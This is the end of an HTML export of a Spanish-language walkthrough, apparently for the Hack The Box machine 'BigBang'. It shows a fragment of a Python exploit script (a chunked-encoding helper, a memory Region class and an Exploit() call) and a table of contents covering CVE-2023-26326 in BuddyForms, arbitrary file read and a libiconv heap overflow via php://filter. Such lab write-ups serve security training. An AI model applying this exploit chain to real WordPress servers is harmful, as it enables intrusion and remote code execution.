<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """</span>
    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>
    <span class="token comment"># enough</span>
    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>
    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>
    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span>


<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""A memory region."""</span>

    start<span class="token punctuation">:</span> <span class="token builtin">int</span>
    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>
    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>
    path<span class="token punctuation">:</span> <span class="token builtin">str</span>

    <span class="token decorator annotation punctuation">@property</span>
    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>start


Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250202210905.png" src="Pasted image 20250202210905.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250202210905.png" src="machines/bigbang/imgs/pasted-image-20250202210905.png"></span></p></div><div class="el-hr"><hr></div><div class="el-hr"><hr></div><div class="mod-footer mod-ui"></div></div></div></div></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="machines/bigbang/01-recon.html#01-Recon"><div class="tree-item-contents heading-link" heading-name="01-Recon"><span class="tree-item-title">01-Recon</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/bigbang/01-recon.html#Port_80_-_Blog.bigbang.htb"><div class="tree-item-contents heading-link" heading-name="Port 80 - Blog.bigbang.htb"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Port 80 - Blog.bigbang.htb</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#Fuzzing"><div class="tree-item-contents heading-link" heading-name="Fuzzing"><span class="tree-item-title">Fuzzing</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#Apis"><div class="tree-item-contents heading-link" heading-name="Apis"><span class="tree-item-title">Apis</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#Wordpress_Plugin_|_BuddyForms"><div class="tree-item-contents heading-link" heading-name="Wordpress Plugin | BuddyForms"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Wordpress Plugin | BuddyForms</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#[CVE-2023-26326](https://nvd.nist.gov/vuln/detail/CVE-2023-26326)"><div class="tree-item-contents heading-link" heading-name="[CVE-2023-26326](https://nvd.nist.gov/vuln/detail/CVE-2023-26326)"><span class="tree-item-title"><a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" target="_blank">CVE-2023-26326</a></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="machines/bigbang/01-recon.html#**arbitrary_file_read**"><div class="tree-item-contents heading-link" heading-name="**arbitrary file read**"><span class="tree-item-title"><strong>arbitrary file read</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/bigbang/01-recon.html#Vulnerabilidad:_Buffer_Overflow_en_`libiconv`"><div class="tree-item-contents heading-link" heading-name="Vulnerabilidad: Buffer Overflow en `libiconv`"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Vulnerabilidad: Buffer Overflow en <code>libiconv</code></span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#Contexto_Técnico"><div class="tree-item-contents heading-link" heading-name="Contexto Técnico"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Contexto Técnico</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#¿Qué_es_ISO-2022-CN-EXT?"><div class="tree-item-contents heading-link" heading-name="¿Qué es ISO-2022-CN-EXT?"><span class="tree-item-title">¿Qué es ISO-2022-CN-EXT?</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#PHP_Heap:_Cómo_Funciona"><div class="tree-item-contents heading-link" heading-name="PHP Heap: Cómo Funciona"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">PHP Heap: Cómo Funciona</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#1._**Asignación_de_Memoria**"><div class="tree-item-contents heading-link" heading-name="1. **Asignación de Memoria**"><span class="tree-item-title">1. 
Asignación de Memoria
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#2._**Estructura_del_Montón_(Heap)**"><div class="tree-item-contents heading-link" heading-name="2. **Estructura del Montón (Heap)**"><span class="tree-item-title">2. 
Estructura del Montón (Heap)
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#3._**Gestión_de_Listas_Libres**"><div class="tree-item-contents heading-link" heading-name="3. **Gestión de Listas Libres**"><span class="tree-item-title">3. 
Gestión de Listas Libres
</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#php://filter:"><div class="tree-item-contents heading-link" heading-name="php://filter:"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">php://filter:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#1._**Flujos_y_Cubetas_(Streams_and_Buckets)**"><div class="tree-item-contents heading-link" heading-name="1. **Flujos y Cubetas (Streams and Buckets)**"><span class="tree-item-title">1. 
Flujos y Cubetas (Streams and Buckets)
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#2._**Procesamiento_de_Filtros**"><div class="tree-item-contents heading-link" heading-name="2. **Procesamiento de Filtros**"><span class="tree-item-title">2. 
Procesamiento de Filtros
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#3._**Cadena_de_Filtros**"><div class="tree-item-contents heading-link" heading-name="3. **Cadena de Filtros**"><span class="tree-item-title">3. 
Cadena de Filtros
</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#Explotación_del_Desbordamiento"><div class="tree-item-contents heading-link" heading-name="Explotación del Desbordamiento"><span class="tree-item-title">Explotación del Desbordamiento</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#1._**Lectura_Arbitraria_de_Archivos**"><div class="tree-item-contents heading-link" heading-name="1. **Lectura Arbitraria de Archivos**"><span class="tree-item-title">1. 
Lectura Arbitraria de Archivos
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#2._**Manipulación_Arbitraria_del_Montón**"><div class="tree-item-contents heading-link" heading-name="2. **Manipulación Arbitraria del Montón**"><span class="tree-item-title">2. 
Manipulación Arbitraria del Montón
</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#3._**Técnica_de_Muñeca_Rusa**"><div class="tree-item-contents heading-link" heading-name="3. **Técnica de Muñeca Rusa**"><span class="tree-item-title">3. 
Técnica de Muñeca Rusa
</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="machines/bigbang/01-recon.html#Flujo_Final_del_Ataque"><div class="tree-item-contents heading-link" heading-name="Flujo Final del Ataque"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Flujo Final del Ataque</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item mod-collapsible" data-depth="3"><a class="tree-link" href="machines/bigbang/01-recon.html#Explicacion_del_Script:"><div class="tree-item-contents heading-link" heading-name="Explicacion del Script:"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Explicacion del Script:</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#**a)_Class_`Remote`**"><div class="tree-item-contents heading-link" heading-name="**a) Class `Remote`**"><span class="tree-item-title"><strong>a) Class <code>Remote</code></strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="4"><a class="tree-link" href="machines/bigbang/01-recon.html#**b)_Class_`Exploit`**"><div class="tree-item-contents heading-link" heading-name="**b) Class `Exploit`**"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title"><strong>b) Class <code>Exploit</code></strong></span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="5"><a class="tree-link" href="machines/bigbang/01-recon.html#**Funciones_clave:**"><div class="tree-item-contents heading-link" heading-name="**Funciones clave:**"><span class="tree-item-title"><strong>Funciones clave:</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>